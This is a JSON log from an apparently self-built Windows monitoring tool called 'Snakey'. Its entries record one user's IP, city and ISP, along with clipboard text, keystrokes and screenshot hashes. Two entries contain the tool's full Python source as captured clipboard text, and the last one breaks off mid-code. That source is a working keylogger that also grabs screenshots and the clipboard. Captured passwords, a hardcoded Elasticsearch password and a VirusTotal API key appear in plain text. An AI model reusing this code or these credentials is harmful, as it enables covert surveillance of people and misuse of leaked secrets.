{"timestamp": "2025-06-10T16:13:08.259070", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "0MdycAj9KTsZ3zSfcSv7", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "2b8ae1d65ff05bd3452a5a4b460ea80cd3f995acace714364520240a9c967978", "screenshot_hash": "d9515da72c566330d78ba958ff84c6bb7a6cb34d05a947733f7bf4a6c2415961", "log_hash": "52b0be2416c3218c8d39a4e7ebadf885e3c99f1e9121e0354f77729ac7d6b052"}
{"timestamp": "2025-06-10T16:13:40.350001", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "0MdycAj9KTsZ3zSfcSv7", "keystrokes": "op_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "2b8ae1d65ff05bd3452a5a4b460ea80cd3f995acace714364520240a9c967978", "screenshot_hash": "c44c83e0f6c35193e5c5319a1583250b4d6b1b40a46e040d6889cc5c0302b1c5", "log_hash": "673c3e851f869501ed27dc2ebf00c33f5bf5e7a610fff30b76c56913fc4b7c16"}
{"timestamp": "2025-06-10T16:20:39.982194", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "vNODISLG+5Y0f*U4mKaI", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "3e95c760b4b403e8bebe4c7db059458c9210f73fa2e013e4e419699d54a84dea", "screenshot_hash": "0fb0c123d56d018a996c7506b3968b71494bc8665135afb66867b0a01ed190bb", "log_hash": "b8591d5e0bbd49831e72fa3e8c8c434d2a263c0e72b2803b4db9035ae54f54c3"}
{"timestamp": "2025-06-10T16:32:06.539480", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch  # Importar a biblioteca do Elasticsearch\r\nimport ssl  # Para lidar com a conex\u00e3o HTTPS\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Elasticsearch Configuration ===\r\n# Substitua 'YOUR_ELASTIC_PASSWORD_HERE' pela senha real do utilizador 'elastic' do seu Elasticsearch.\r\n# Exemplo de uma senha gerada: '0MdycAj9KTsZ3zSfcSv7'\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\n# Desativar a verifica\u00e7\u00e3o SSL (APENAS PARA AMBIENTES DE DESENVOLVIMENTO/TESTE).\r\n# Em produ\u00e7\u00e3o, voc\u00ea DEVE configurar certificados SSL v\u00e1lidos.\r\nes_context = ssl._create_unverified_context()\r\n\r\nes_client = None  # Inicializa como None para ser configurado ap\u00f3s a chave de criptografia\r\ntry:\r\n    es_client = Elasticsearch(\r\n        hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n        basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n        ssl_context=es_context  # Usar o contexto SSL n\u00e3o verificado\r\n    )\r\n    if not es_client.ping():\r\n        print(\"[WARNING] N\u00e3o foi poss\u00edvel conectar ao Elasticsearch. Verifique se est\u00e1 a correr e as credenciais.\")\r\n        es_client = None  # Reseta para None se a conex\u00e3o falhar\r\n    else:\r\n        print(\"[INFO] Conex\u00e3o bem-sucedida ao Elasticsearch!\")\r\nexcept Exception as e:\r\n    print(f\"[ERROR] Erro ao inicializar cliente Elasticsearch: {e}\")\r\n    es_client = None\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            # Remove keys that might cause issues (e.g., non-string, non-numeric, deeply nested objects if not handled well)\r\n            # For simplicity, let's ensure the dictionary is flat or contains basic types for now.\r\n            # You might need more sophisticated data cleaning for complex objects.\r\n\r\n            # Create a copy to avoid modifying the original session_log\r\n            data_to_send = data.copy()\r\n\r\n            # Example: Convert datetime objects to string if any were accidentally added before json.dumps\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # You might want to define a custom ID or let Elasticsearch generate one\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            print(f\"[SUCCESS] Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except Exception as e:\r\n            print(f\"[ERROR] Falha ao enviar log para Elasticsearch: {e}\")\r\n    else:\r\n        print(\"[WARNING] Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        # === Public IP and ISP lookup ===\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:  # Collect keystrokes for 10 seconds\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    # The log_string and log_hash calculation should ideally happen after all data is collected\r\n    # and before sending to ES, so the hash represents the full log.\r\n    # No need to sort_keys for hash calculation if you consistently do it or if JSON is just for display.\r\n    # For consistent hashing, you might want a stable serialization.\r\n    log_string_for_hash = json.dumps(session_log, sort_keys=True,\r\n                                     default=str)  # Use default=str for non-JSON serializable types\r\n    session_log[\"log_hash\"] = hash_text(log_string_for_hash)  # Hash the string representation for integrity\r\n\r\n    try:\r\n        # Load existing logs\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        # Load or initialize ledger as a list of dicts\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n            # If ledger is a list of strings (legacy), convert to list of dicts\r\n            if ledger and isinstance(ledger[0], str):\r\n                # This conversion logic assumes the old format was just hashes\r\n                ledger = [{\r\n                    \"timestamp\": \"unknown\",  # Or try to parse from the old log structure if available\r\n                    \"log_hash\": h,\r\n                    \"previous_hash\": \"0\" * 64,\r\n                    \"chained_hash\": \"0\" * 64\r\n                } for h in ledger]\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":  # Corrigi para o padr\u00e3o correto __name__ == \"__main__\"\r\n\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)  # <--- Chama a fun\u00e7\u00e3o para enviar para o Elasticsearch\r\n\r\n        time.sleep(15)  # Espera 15 segundos antes da pr\u00f3xima coleta\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "0ffcb27a491fabea1c490481e6970a3dbd9bc178a1fc68d59ed7f5f00b60325c", "screenshot_hash": "7eb2b75b30afe858f4e016de4f9f1d6b5fcbfdcd24bf322d746c8609c3f46b56", "log_hash": "7be33f14a6203fef569041e364b5f057b81890e0d2f0e625348ba6439978d24d"}
{"timestamp": "2025-06-10T16:41:58.523597", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException # Import specific Elasticsearch exceptions\r\nimport ssl # Para lidar com a conex\u00e3o HTTPS\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n# Define a dedicated log file for the daemon's internal errors\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\" # CONSIDER MOVING TO ENV VARS\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# --- New: Centralized Logging Function ---\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        # Also print to stdout/stderr for immediate daemon output if available\r\n        print(log_entry.strip())\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip()) # Fallback to printing if log file fails\r\n\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI' # Ensure this is correct and securely stored for production\r\n\r\n# Desativar a verifica\u00e7\u00e3o SSL (APENAS PARA AMBIENTES DE DESENVOLVIMENTO/TESTE).\r\n# Em produ\u00e7\u00e3o, voc\u00ea DEVE configurar certificados SSL v\u00e1lidos.\r\nes_context = ssl._create_unverified_context()\r\n\r\nes_client = None # Inicializa como None para ser configurado ap\u00f3s a chave de criptografia\r\n\r\n# --- New: Pre-check with requests for basic connectivity ---\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    # Use a dummy request to check basic connectivity and SSL handling\r\n    # Adding stream=True to prevent reading large responses, just check connection\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD), verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    # Read a small chunk or none, then close connection immediately\r\n    response.raw.read(1)\r\n    response.close()\r\n    log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful.\")\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n\r\n# --- Original Elasticsearch Client Initialization with more specific error handling ---\r\ntry:\r\n    es_client = Elasticsearch(\r\n        hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n        basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n        ssl_context=es_context, # Usar o contexto SSL n\u00e3o verificado\r\n        request_timeout=30 # Add a timeout for the client operations\r\n    )\r\n    if not es_client.ping():\r\n        log_daemon_message(\"WARNING\", \"N\u00e3o foi poss\u00edvel conectar ao Elasticsearch (ping failed). Verifique se est\u00e1 a correr e as credenciais.\")\r\n        es_client = None # Reseta para None se a conex\u00e3o falhar\r\n    else:\r\n        log_daemon_message(\"INFO\", \"Conex\u00e3o bem-sucedida ao Elasticsearch!\")\r\nexcept ConnectionError as e:\r\n    log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error: {e}. This often means the host is unreachable or connection refused.\")\r\n    es_client = None\r\nexcept AuthenticationException as e:\r\n    log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n    es_client = None\r\nexcept TransportError as e:\r\n    log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error (HTTP status {e.status_code}): {e.info}. This indicates a problem on the Elasticsearch server side or request formatting.\")\r\n    es_client = None\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Erro inesperado ao inicializar cliente Elasticsearch: {e}\")\r\n    es_client = None\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Using log_daemon_message for internal debugging\r\n            log_daemon_message(\"DEBUG\", f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n    else:\r\n        log_daemon_message(\"WARNING\", \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": 